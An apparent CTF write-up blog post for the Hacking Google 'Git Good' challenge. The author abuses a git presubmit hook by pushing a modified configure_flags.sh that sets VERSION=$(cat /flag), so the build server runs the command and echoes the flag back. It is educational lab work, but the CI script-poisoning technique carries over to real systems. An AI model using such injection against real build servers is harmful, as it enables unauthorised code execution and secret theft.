---
layout: post
title:  "H4CK1NG G00GL3 - EP4C03"
subtitle: "Episode 004 - Challenge 03 - Git Good"
date:   2024-10-19 10:05:34 +0300
tags: [CTF, research, hacking-google, git]
readtime: true
cover-img: ["/assets/images/Hacking-Google/Hacking-Google-Cover.png"]
thumbnail-img: "/assets/images/Hacking-Google/Hacking-Google-Thumbnail.png"
share-img: "/assets/images/Hacking-Google/Hacking-Google-Ep04-C3-contributing.png"
---

Wrapping up this episode's challenges, in this one I get a hint:

> Look around the site to find out how to contribute.

This made me remember that, while reviewing the code during the challenge, there was this following handler:

```javascript
app.get('/contributing', authenticate, adminsOnly, function (req, res, next) {
  return res.render('contributing', { user: req.user })
})
```

It serves a contribution page, which the hint alludes to. However, it has the `adminsOnly` options which means that the code validates I'm logged in as an administrator user.

Luckily, in the end of the previous challenge, I succesfully managed to hack my way into the admininstrator user `don`. 

So now that I'm logged in as admin, the `/contributing` page is open for me. I browsed to `https://vrp-website-web.h4ck.ctfcompetition.com/contributing` and landed on this page:

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Hacking-Google/Hacking-Google-Ep04-C3-contributing.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>The Contributing page</i></figcaption>
</figure>

The page describes how to contribute to the VRP website. The most interesting part is that it provides a `git://` URL containing the website's source code.

So, as instructed, I cloned it:

```sh
tal@tal:~/hackinggoogle$ git clone git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
Cloning into 'vrp_repo'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 7 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (7/7), done.
```

Alright, what's in it? 

It's a web server written in Go, serving three endpoints: `/`, `/import` and `/export`. These are the endpoints I needed to exploit during the first challenge in this episode. This is the point I got to before completing the first challenge, using the code to reveal the correct parameter name that I was stuck on.

Coming back to this challenge afterwards, reviewing the entire handling code didn't reveal much, as the handlers had the same code as I expected to see after probing them, black-box style.

So what now? The text on the contributing page mentioned that, when making changes, I should check into a new branch and create a pull request. 

I guess I need to probe the git server I have it. Could be interesting to see what affect I can make on it when trying to push new code.

I made a small change to the handler code, and tried to push the new version:

```sh
tal@tal:~/hackinggoogle$ cd vrp_repo/
tal@tal:~/hackinggoogle/vrp_repo$ git checkout -b my-feature
Switched to a new branch 'my-feature'
tal@tal:~/hackinggoogle/vrp_repo$ vi app.go # Adding a comment
tal@tal:~/hackinggoogle/vrp_repo$ git add .
tal@tal:~/hackinggoogle/vrp_repo$ git commit -m "Test new feature"
[my-feature 394a730] Test new feature
 1 file changed, 1 insertion(+)
tal@tal:~/hackinggoogle/vrp_repo$ git push --set-upstream origin my-feature
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 306 bytes | 306.00 KiB/s, done.
Total 3 (delta 2), reused 0 (delta 0), pack-reused 0
remote: Skipping presubmit (enable via push option)
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] my-feature -> my-feature (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

Well, the remote git server replies with

> Thank you for your interest, but we are no longer accepting proposals

So pushing new code doesn't seem to be possible. Not surprising.

However just before this, the server also prints out 

>Skipping presubmit (enable via push option)

Searching the internet, I didn't find an explicit mention of what "presubmit" is, but what I read points to it being a *git hook*. A [guide on hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) explains that Git allows creation of custom scripts that fire off at certain git actions, like comitting or pushing code. 

These are also the two versions of hooks - client side and server side. It seems that the one I saw is a server side hook that fires just before pushing new code (even though the final result is it being denied).

While during the push the hook was skipped, the message hints that it's possible to enable it forcibly by sending a push option. It's a simple flag that gets a string and simply passes it to the Git server which in turn forwards it to the differnet hooks. 

Let's try:

```sh
tal@tal:~/hackinggoogle/vrp_repo$ git push --set-upstream origin my-feature --push-option=presubmit
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 306 bytes | 306.00 KiB/s, done.
Total 3 (delta 2), reused 0 (delta 0), pack-reused 0
remote: Starting presubmit check
remote: Cloning into 'tmprepo'...
remote: done.
remote: HEAD is now at 394a730 Test new feature
remote: Building version v0.1.1
remote: ./build.sh: line 5: go: command not found
remote: Build server must be misconfigured again...
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] my-feature -> my-feature (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

Alright! It seems the presubmit check code has ran. Any prints happening during the hook are reflected back to me. One specifically interesting one is an error - `remote: ./build.sh: line 5: go: command not found`.

So, the server seem to run `build.sh` on the presubmit hook! The file exists in the Git repo:

```sh
#!/usr/bin/env bash

source configure_flags.sh &>/dev/null
echo "Building version ${VERSION}"
go build -ldflags="${LDFLAGS[*]}"
```

So what if I simply change it and try to push a new commit that includes changes to this file? Would that run my code?

I added a `cat /flag` command at the beginning of `build.sh` and tried to push again:

```sh
tal@tal:~/hackinggoogle/vrp_repo$ vim build.sh # Added a simple echo then cat /flag
tal@tal:~/hackinggoogle/vrp_repo$ git add build.sh
tal@tal:~/hackinggoogle/vrp_repo$ git commit -m "Changes build.sh"
[my-feature d0fccb1] Changes build.sh
 1 file changed, 2 insertions(+)
tal@tal:~/hackinggoogle/vrp_repo$ git push --set-upstream origin my-feature --push-option=presubmit
Enumerating objects: 9, done.
Counting objects: 100% (9/9), done.
Delta compression using up to 2 threads
Compressing objects: 100% (6/6), done.
Writing objects: 100% (6/6), 779 bytes | 779.00 KiB/s, done.
Total 6 (delta 2), reused 0 (delta 0), pack-reused 0
remote: Starting presubmit check
remote: Cloning into 'tmprepo'...
remote: done.
remote: HEAD is now at d0fccb1 Changes build.sh
remote: Building version v0.1.1
remote: ./build.sh: line 5: go: command not found
remote: Build server must be misconfigured again...
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] my-feature -> my-feature (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

Nope. Same error. Looks like even though it's cloning my code into a new repo, it's using the old `build.sh` file. 

Hmm, I wasn't sure what to do in at the point, but I had come up with some reasons why `build.sh` was not overriden. However, inside, it calls `source` on `configure_flags.sh` which is another file in the Git repo. The `source` command simply executes the second bash file commands in the same shell.

Can I try to override `configure_flag.sh` instead? It could be that the usage of another file would make the server use the new one I'm pushing. 

I updated the `configure_flags.sh` file to also include a print. But as another test, I decided to adhere to the comment and also change the version string, just to see what would happen:

```sh
#!/usr/bin/env bash

echo "Test"
cat /flag
# IMPORTANT: Make sure to bump this before pushing a new binary.
VERSION="v0.1.2" # Was v0.1.1
COMMIT_HASH="$(git rev-parse --short HEAD)"
BUILD_TIMESTAMP=$(date '+%Y-%m-%dT%H:%M:%S')

LDFLAGS=(
  "-X 'main.Version=${VERSION}'"
  "-X 'main.CommitHash=${COMMIT_HASH}'"
  "-X 'main.BuildTime=${BUILD_TIMESTAMP}'"
)
# 
```

Pushing again:

```sh
tal@tal:~/hackinggoogle/vrp_repo$ git add configure_flags.sh
tal@tal:~/hackinggoogle/vrp_repo$ git commit -m "Changes configure_flags.sh"
[my-feature b73843b] Changes configure_flags.sh
 1 file changed, 3 insertions(+), 1 deletion(-)
tal@tal:~/hackinggoogle/vrp_repo$ git push --set-upstream origin my-feature --push-option=presubmit
Enumerating objects: 13, done.
Counting objects: 100% (13/13), done.
Delta compression using up to 2 threads
Compressing objects: 100% (9/9), done.
Writing objects: 100% (9/9), 1.03 KiB | 1.03 MiB/s, done.
Total 9 (delta 4), reused 0 (delta 0), pack-reused 0
remote: Starting presubmit check
remote: Cloning into 'tmprepo'...
remote: done.
remote: HEAD is now at b73843b Changes configure_flags.sh
remote: Building version v0.1.2
remote: ./build.sh: line 5: go: command not found
remote: Build server must be misconfigured again...
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] my-feature -> my-feature (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

Okay so the `echo` and `cat` did not happen, but I noticed that the version has changed to my new string! That means I have *some* effect on the presubmit hook.

What could I do now?

The `build.sh` code has the following command `echo "Building version ${VERSION}"`. So I can reliably change `VERSION` to whatever I want and the server will send it back to me. Let's change it to the output of the `cat` command I want to run so bad:

```sh
#!/usr/bin/env bash

# IMPORTANT: Make sure to bump this before pushing a new binary.
VERSION=$(cat /flag)
COMMIT_HASH="$(git rev-parse --short HEAD)"
BUILD_TIMESTAMP=$(date '+%Y-%m-%dT%H:%M:%S')

LDFLAGS=(
  "-X 'main.Version=${VERSION}'"
  "-X 'main.CommitHash=${COMMIT_HASH}'"
  "-X 'main.BuildTime=${BUILD_TIMESTAMP}'"
)
# 
```

And let's try pushing again:

```sh
tal@tal:~/hackinggoogle/vrp_repo$ git add configure_flags.sh
tal@tal:~/hackinggoogle/vrp_repo$ git commit -m "Changes configure_flags.sh yet again"
[my-feature 26b8333] Changes configure_flags.sh yet again
 1 file changed, 1 insertion(+), 3 deletions(-)
tal@tal:~/hackinggoogle/vrp_repo$ git push --set-upstream origin my-feature --push-option=presubmit
Enumerating objects: 16, done.
Counting objects: 100% (16/16), done.
Delta compression using up to 2 threads
Compressing objects: 100% (12/12), done.
Writing objects: 100% (12/12), 1.30 KiB | 1.30 MiB/s, done.
Total 12 (delta 6), reused 0 (delta 0), pack-reused 0
remote: Starting presubmit check
remote: Cloning into 'tmprepo'...
remote: done.
remote: HEAD is now at 26b8333 Changes configure_flags.sh yet again
remote: Building version https://h4ck1ng.google/solve/...
remote: ./build.sh: line 5: go: command not found
remote: Build server must be misconfigured again...
remote: Thank you for your interest, but we are no longer accepting proposals
To git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo
 ! [remote rejected] my-feature -> my-feature (pre-receive hook declined)
error: failed to push some refs to 'git://dont-trust-your-sources.h4ck.ctfcompetition.com:1337/tmp/vrp_repo'
```

And the server replied with the flag, nice! Like the flag you can't see says, running commands on hooks can potentialy lead to easy RCEs!